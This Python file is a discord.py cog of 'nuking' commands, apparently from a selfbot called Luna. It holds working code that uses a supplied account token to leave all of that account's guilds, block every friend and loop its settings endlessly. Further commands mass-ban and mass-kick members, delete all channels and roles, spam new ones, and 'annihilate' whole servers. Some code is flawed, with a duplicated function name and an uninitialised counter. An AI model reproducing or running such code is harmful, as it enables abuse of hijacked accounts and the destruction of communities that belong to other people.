import discord
from discord.ext import commands
from discord.ext.commands import has_permissions
import requests
import main as luna
import asyncio
from datetime import datetime
import httpx

start = datetime.now()

class NukingCog(commands.Cog, name="Nuking commands"):
	def __init__(self, bot:commands.bot):
		self.bot = bot

	@commands.command(name = "nuketoken",
					usage="<token>",
					description = "Nuke and destroy the token")
	async def nuketoken(self, ctx, token:str):
		await ctx.message.delete()
		if luna.riskmode() == "on":
			try:
				guilds = requests.get('https://canary.discordapp.com/api/v8/users/@me/guilds', headers={'authorization': token, 'user-agent': 'Mozilla/5.0'}).json()
				for guild in range(0, len(guilds)):
					guild_id = guilds[guild]['id']
					requests.delete(f'https://canary.discordapp.com/api/v8/users/@me/guilds/{guild_id}', headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
				friends = requests.get('https://canary.discordapp.com/api/v8/users/@me/relationships', headers={'authorization': token, 'user-agent': 'Mozilla/5.0'}).json()
				for friend in range(0, len(friends)):
					friend_id = friends[friend]['id']
					requests.put(f'https://canary.discordapp.com/api/v8/users/@me/relationships/{friend_id}', json={'type': 2}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
					requests.delete(f'https://canary.discordapp.com/api/v8/channels/{friend_id}', headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
			except Exception:
				pass
		else:
			embed = discord.Embed(title="Error", url=luna.titleurlvar(), description=f"Riskmode is disabled", color=0xff0000)
			embed.set_thumbnail(url=luna.imagevar())
			embed.set_footer(text=luna.footervar(), icon_url=luna.footer_iconurlvar())
			embed.set_author(name=luna.authorvar(), url=luna.authorurlvar(), icon_url=luna.author_iconurlvar())
			embed.set_image(url=luna.largeimagevar())
			await luna.send(ctx, embed)

	@commands.command(name = "fucktoken",
					usage="<token>",
					description = "Change settings on the token")
	async def nuketoken(self, ctx, token:str):
		await ctx.message.delete()
		if luna.riskmode() == "on":
			payload = {
				'theme': "light",
				'locale': "ja",
				'message_display_compact': False,
				'inline_embed_media': False,
				'inline_attachment_media': False,
				'gif_auto_play': False,
				'render_embeds': False,
				'render_reactions': False,
				'animate_emoji': False,
				'convert_emoticons': False,
				'enable_tts_command': False,
				'explicit_content_filter': '0',
				'status': "invisible"
			}
			
			requests.patch('https://canary.discordapp.com/api/v8/users/@me/settings', json=payload, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
			try:
				while True:
					async with httpx.AsyncClient() as client:
						await client.patch('https://canary.discordapp.com/api/v8/users/@me/settings', json={'theme': "light"}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
						await client.patch('https://canary.discordapp.com/api/v8/users/@me/settings', json={'theme': "dark"}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
			except Exception:
				return
		else:
			embed = discord.Embed(title="Error", url=luna.titleurlvar(), description=f"Riskmode is disabled", color=0xff0000)
			embed.set_thumbnail(url=luna.imagevar())
			embed.set_footer(text=luna.footervar(), icon_url=luna.footer_iconurlvar())
			embed.set_author(name=luna.authorvar(), url=luna.authorurlvar(), icon_url=luna.author_iconurlvar())
			embed.set_image(url=luna.largeimagevar())
			await luna.send(ctx, embed)
        
	@commands.command(name = "massban",
					usage="<guild_id>",
					description = "Massban a guild")
	@has_permissions(ban_members=True)
	async def massban(self, ctx, guild_id:int):
		await ctx.message.delete()
		if luna.riskmode() == "on":
			guild_id = int(guild_id)
			guildhit = self.bot.get_guild(guild_id)
			members = guildhit.members
			elapsed = datetime.now() - start
			elapsed = f'{elapsed.microseconds}'
			elapsed = elapsed[:-3]
			for member in members:
				if member is not ctx.author:
					try:
						count = count + 1
						await member.ban()
						luna.printmessage(f"Banned {luna.bcolors.COMMANDVAR}{member}{luna.bcolors.RESET}")
					except Exception:
						luna.printerror(f"Failed to ban {luna.bcolors.COMMANDVAR}{member}{luna.bcolors.RESET}")
			luna.printmessage(f"Finished banning in {luna.bcolors.COMMANDVAR}{elapsed}{luna.bcolors.RESET}ms")
		else:
			embed = discord.Embed(title="Error", url=luna.titleurlvar(), description=f"Riskmode is disabled", color=0xff0000)
			embed.set_thumbnail(url=luna.imagevar())
			embed.set_footer(text=luna.footervar(), icon_url=luna.footer_iconurlvar())
			embed.set_author(name=luna.authorvar(), url=luna.authorurlvar(), icon_url=luna.author_iconurlvar())
			embed.set_image(url=luna.largeimagevar())
			await luna.send(ctx, embed)

	@commands.command(name = "masskick",
					usage="<guild_id>",
					description = "Masskick a guild")
	@has_permissions(kick_members=True)
	async def masskick(self, ctx, guild_id:int):
		await ctx.message.delete()
		if luna.riskmode() == "on":
			guild_id = int(guild_id)
			guildhit = self.bot.get_guild(guild_id)
			members = guildhit.members
			elapsed = datetime.now() - start
			elapsed = f'{elapsed.microseconds}'
			elapsed = elapsed[:-3]
			for member in members:
				if member is not ctx.author:
					try:
						count = count + 1
						await member.kick()
						luna.printmessage(f"Kicked {luna.bcolors.COMMANDVAR}{member}{luna.bcolors.RESET}")
					except Exception:
						luna.printerror(f"Failed to kick {luna.bcolors.COMMANDVAR}{member}{luna.bcolors.RESET}")
			luna.printmessage(f"Finished kicking in {luna.bcolors.COMMANDVAR}{elapsed}{luna.bcolors.RESET}ms")
		else:
			embed = discord.Embed(title="Error", url=luna.titleurlvar(), description=f"Riskmode is disabled", color=0xff0000)
			embed.set_thumbnail(url=luna.imagevar())
			embed.set_footer(text=luna.footervar(), icon_url=luna.footer_iconurlvar())
			embed.set_author(name=luna.authorvar(), url=luna.authorurlvar(), icon_url=luna.author_iconurlvar())
			embed.set_image(url=luna.largeimagevar())
			await luna.send(ctx, embed)

	@commands.command(name = "masschannels",
					usage="<guild_id> <amount> <name>",
					description = "Mass create channels")
	@has_permissions(manage_channels=True)
	async def masschannels(self, ctx, guild_id:int, amount:int, *, name:str):
		await ctx.message.delete()
		if luna.riskmode() == "on":
			guildhit = self.bot.get_guild(guild_id)
			elapsed = datetime.now() - start
			elapsed = f'{elapsed.microseconds}'
			elapsed = elapsed[:-3]
			for i in range(0, amount):
				try:
					await guildhit.create_text_channel(name=f"{name}")
					luna.printmessage(f"Created channel {luna.bcolors.COMMANDVAR}{name}{luna.bcolors.RESET}")
				except Exception:
					luna.printerror(f"Failed to create channel {luna.bcolors.COMMANDVAR}{name}{luna.bcolors.RESET}")
			luna.printmessage(f"Finished creating channels in {luna.bcolors.COMMANDVAR}{elapsed}{luna.bcolors.RESET}ms")
		else:
			embed = discord.Embed(title="Error", url=luna.titleurlvar(), description=f"Riskmode is disabled", color=0xff0000)
			embed.set_thumbnail(url=luna.imagevar())
			embed.set_footer(text=luna.footervar(), icon_url=luna.footer_iconurlvar())
			embed.set_author(name=luna.authorvar(), url=luna.authorurlvar(), icon_url=luna.author_iconurlvar())
			embed.set_image(url=luna.largeimagevar())
			await luna.send(ctx, embed)

	@commands.command(name = "massroles",
					usage="<guild_id> <amount> <name>",
					description = "Mass create roles")
	@has_permissions(manage_roles=True)
	async def massroles(self, ctx, guild_id:int, amount:int, *, name:str):
		await ctx.message.delete()
		if luna.riskmode() == "on":
			guildhit = self.bot.get_guild(guild_id)
			elapsed = datetime.now() - start
			elapsed = f'{elapsed.microseconds}'
			elapsed = elapsed[:-3]
			for i in range(0, amount):
				try:
					await guildhit.create_roles(name=f"{name}")
					luna.printmessage(f"Created role {luna.bcolors.COMMANDVAR}{name}{luna.bcolors.RESET}")
				except Exception:
					luna.printerror(f"Failed to create role {luna.bcolors.COMMANDVAR}{name}{luna.bcolors.RESET}")
			luna.printmessage(f"Finished creating roles in {luna.bcolors.COMMANDVAR}{elapsed}{luna.bcolors.RESET}ms")
		else:
			embed = discord.Embed(title="Error", url=luna.titleurlvar(), description=f"Riskmode is disabled", color=0xff0000)
			embed.set_thumbnail(url=luna.imagevar())
			embed.set_footer(text=luna.footervar(), icon_url=luna.footer_iconurlvar())
			embed.set_author(name=luna.authorvar(), url=luna.authorurlvar(), icon_url=luna.author_iconurlvar())
			embed.set_image(url=luna.largeimagevar())
			await luna.send(ctx, embed)

	@commands.command(name = "massdelchannels",
					usage="<guild_id>",
					description = "Mass delete channels")
	@has_permissions(manage_channels=True)
	async def massdelchannels(self, ctx, guild_id:int):
		await ctx.message.delete()
		if luna.riskmode() == "on":
			guildhit = self.bot.get_guild(guild_id)
			channels = guildhit.channels
			elapsed = datetime.now() - start
			elapsed = f'{elapsed.microseconds}'
			elapsed = elapsed[:-3]
			for channel in channels:
				try:
					await channel.delete()
					luna.printmessage(f"Deleted channel {luna.bcolors.COMMANDVAR}{channel}{luna.bcolors.RESET}")
				except Exception:
					luna.printerror(f"Failed to delete channel {luna.bcolors.COMMANDVAR}{channel}{luna.bcolors.RESET}")
			luna.printmessage(f"Finished deleting channels in {luna.bcolors.COMMANDVAR}{elapsed}{luna.bcolors.RESET}ms")
		else:
			embed = discord.Embed(title="Error", url=luna.titleurlvar(), description=f"Riskmode is disabled", color=0xff0000)
			embed.set_thumbnail(url=luna.imagevar())
			embed.set_footer(text=luna.footervar(), icon_url=luna.footer_iconurlvar())
			embed.set_author(name=luna.authorvar(), url=luna.authorurlvar(), icon_url=luna.author_iconurlvar())
			embed.set_image(url=luna.largeimagevar())
			await luna.send(ctx, embed)

	@commands.command(name = "massdelroles",
					usage="<guild_id>",
					description = "Mass delete roles")
	@has_permissions(manage_roles=True)
	async def massdelroles(self, ctx, guild_id:int):
		await ctx.message.delete()
		if luna.riskmode() == "on":
			guildhit = self.bot.get_guild(guild_id)
			roles = guildhit.roles
			roles.pop(0)
			elapsed = datetime.now() - start
			elapsed = f'{elapsed.microseconds}'
			elapsed = elapsed[:-3]
			for role in roles:
				try:
					await role.delete()
					luna.printmessage(f"Deleted role {luna.bcolors.COMMANDVAR}{role}{luna.bcolors.RESET}")
				except Exception:
					luna.printerror(f"Failed to delete role {luna.bcolors.COMMANDVAR}{role}{luna.bcolors.RESET}")
			luna.printmessage(f"Finished deleting roles in {luna.bcolors.COMMANDVAR}{elapsed}{luna.bcolors.RESET}ms")
		else:
			embed = discord.Embed(title="Error", url=luna.titleurlvar(), description=f"Riskmode is disabled", color=0xff0000)
			embed.set_thumbnail(url=luna.imagevar())
			embed.set_footer(text=luna.footervar(), icon_url=luna.footer_iconurlvar())
			embed.set_author(name=luna.authorvar(), url=luna.authorurlvar(), icon_url=luna.author_iconurlvar())
			embed.set_image(url=luna.largeimagevar())
			await luna.send(ctx, embed)

	@commands.command(name = "annihilate",
					aliases=['destroy', 'wipe', 'nukeserver'],
					usage="<guild_id> <channel_name> <role_name>",
					description = "Totally annihilate a guild")
	@has_permissions(manage_roles=True, manage_channels=True, ban_members=True)
	async def annihilate(self, ctx, guild_id:int, channel_name:str, role_name:str):
		await ctx.message.delete()
		if luna.riskmode() == "on":
			guildhit = self.bot.get_guild(guild_id)
			roles = guildhit.roles
			roles.pop(0)
			amount = 50
			members = guildhit.members
			channels = guildhit.channels
			elapsed = datetime.now() - start
			elapsed = f'{elapsed.microseconds}'
			elapsed = elapsed[:-3]
			for channel in channels:
				try:
					await channel.delete()
					luna.printmessage(f"Deleted channel {luna.bcolors.COMMANDVAR}{channel}{luna.bcolors.RESET}")
				except Exception:
					luna.printerror(f"Failed to delete channel {luna.bcolors.COMMANDVAR}{channel}{luna.bcolors.RESET}")
			luna.printmessage(f"Finished deleting channels in {luna.bcolors.COMMANDVAR}{elapsed}{luna.bcolors.RESET}ms")
			for role in roles:
				try:
					await role.delete()
					luna.printmessage(f"Deleted role {luna.bcolors.COMMANDVAR}{role}{luna.bcolors.RESET}")
				except Exception:
					luna.printerror(f"Failed to delete role {luna.bcolors.COMMANDVAR}{role}{luna.bcolors.RESET}")
			luna.printmessage(f"Finished deleting roles in {luna.bcolors.COMMANDVAR}{elapsed}{luna.bcolors.RESET}ms")
			for i in range(0, amount):
				try:
					await guildhit.create_text_channel(name=f"{channel_name}")
					luna.printmessage(f"Created channel {luna.bcolors.COMMANDVAR}{channel_name}{luna.bcolors.RESET}")
				except Exception:
					luna.printerror(f"Failed to create channel {luna.bcolors.COMMANDVAR}{channel_name}{luna.bcolors.RESET}")
			luna.printmessage(f"Finished creating channels in {luna.bcolors.COMMANDVAR}{elapsed}{luna.bcolors.RESET}ms")
			for i in range(0, amount):
				try:
					await guildhit.create_roles(name=f"{role_name}")
					luna.printmessage(f"Created role {luna.bcolors.COMMANDVAR}{role_name}{luna.bcolors.RESET}")
				except Exception:
					luna.printerror(f"Failed to create role {luna.bcolors.COMMANDVAR}{role_name}{luna.bcolors.RESET}")
			luna.printmessage(f"Finished creating roles in {luna.bcolors.COMMANDVAR}{elapsed}{luna.bcolors.RESET}ms")
			for member in members:
				if member is not ctx.author:
					try:
						count = count + 1
						await member.ban()
						luna.printmessage(f"Banned {luna.bcolors.COMMANDVAR}{member}{luna.bcolors.RESET}")
					except Exception:
						luna.printerror(f"Failed to ban {luna.bcolors.COMMANDVAR}{member}{luna.bcolors.RESET}")
			luna.printmessage(f"Finished banning in {luna.bcolors.COMMANDVAR}{elapsed}{luna.bcolors.RESET}ms")
			luna.printmessage(f"Finished annihilating in {luna.bcolors.COMMANDVAR}{elapsed}{luna.bcolors.RESET}ms")
		else:
			embed = discord.Embed(title="Error", url=luna.titleurlvar(), description=f"Riskmode is disabled", color=0xff0000)
			embed.set_thumbnail(url=luna.imagevar())
			embed.set_footer(text=luna.footervar(), icon_url=luna.footer_iconurlvar())
			embed.set_author(name=luna.authorvar(), url=luna.authorurlvar(), icon_url=luna.author_iconurlvar())
			embed.set_image(url=luna.largeimagevar())
			await luna.send(ctx, embed)

def setup(bot:commands.Bot):
	bot.add_cog(NukingCog(bot))